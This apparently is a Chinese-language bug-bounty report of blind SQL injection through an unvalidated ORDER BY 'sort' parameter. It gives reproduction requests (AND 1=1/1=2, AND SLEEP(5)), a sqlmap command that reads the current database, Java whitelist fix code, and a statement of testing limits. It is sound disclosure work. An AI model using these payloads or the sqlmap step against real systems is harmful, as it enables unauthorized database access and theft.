# 【严重】XXX接口 SQL 注入

## 1. 漏洞信息

| 项 | 内容 |
|---|---|
| 影响域名 | https://sub.target.com |
| 漏洞类型 | SQL 注入（布尔盲注） |
| 危害等级 | 严重 |
| 是否需要登录 | 否 |
| 复现难度 | 低 |

## 2. 复现步骤

**步骤 1**：正常请求

```
GET /api/items?sort=name HTTP/1.1
Host: sub.target.com
```

返回商品列表，正常。

**步骤 2**：布尔真条件

```
GET /api/items?sort=name AND 1=1 HTTP/1.1
```

返回正常结果（与步骤1一致）。

**步骤 3**：布尔假条件

```
GET /api/items?sort=name AND 1=2 HTTP/1.1
```

返回空列表 / 500 错误，与真条件响应明显不同，确认注入存在。

**步骤 4**：时间盲注交叉验证

```
GET /api/items?sort=name AND SLEEP(5) HTTP/1.1
```

响应延迟约 5 秒，确认可执行任意 SQL。

**步骤 5**：只读验证当前库名

```
sqlmap -u "https://sub.target.com/api/items?sort=name" \
       --batch --technique=BT --current-db --random-agent
```

输出：`current database: 'xxx_prod'`

## 3. 影响范围与危害

- sort 参数直接拼接进 ORDER BY，未做白名单校验
- 可注入任意 SQL，具备数据库读写权限
- 可读取全库业务数据（用户表、订单表、支付记录）
- 若数据库账号具备 FILE 权限，可进一步写入 webshell 获取服务器控制权
- 严重程度：可导致全站数据泄露

## 4. 修复建议

1. ORDER BY 排序字段必须使用白名单映射，禁止直接拼接用户输入
   ```java
   // 错误
   String sql = "SELECT * FROM items ORDER BY " + sort;
   // 正确
   Map<String,String> allow = Map.of("name","name","price","price","time","create_time");
   String col = allow.getOrDefault(sort, "id");
   String sql = "SELECT * FROM items ORDER BY " + col;
   ```
2. 全站排查其他 ORDER BY / LIMIT 拼接点
3. 数据库账号降权，移除 FILE / DROP 权限
4. 部署 WAF 规则拦截注入特征

## 5. 佐证材料

- 附件1：1=1 与 1=2 响应差异对比截图
- 附件2：SLEEP(5) 延迟证明截图
- 附件3：sqlmap current-db 输出（仅库名，未 dump 任何数据）
- 附件4：资产范围截图

## 6. 测试边界声明

测试全流程仅使用布尔与时间盲注判断，**未读取、未下载任何表数据**，
仅验证 current-db 证明注入可执行。未尝试任何写文件或提权操作。
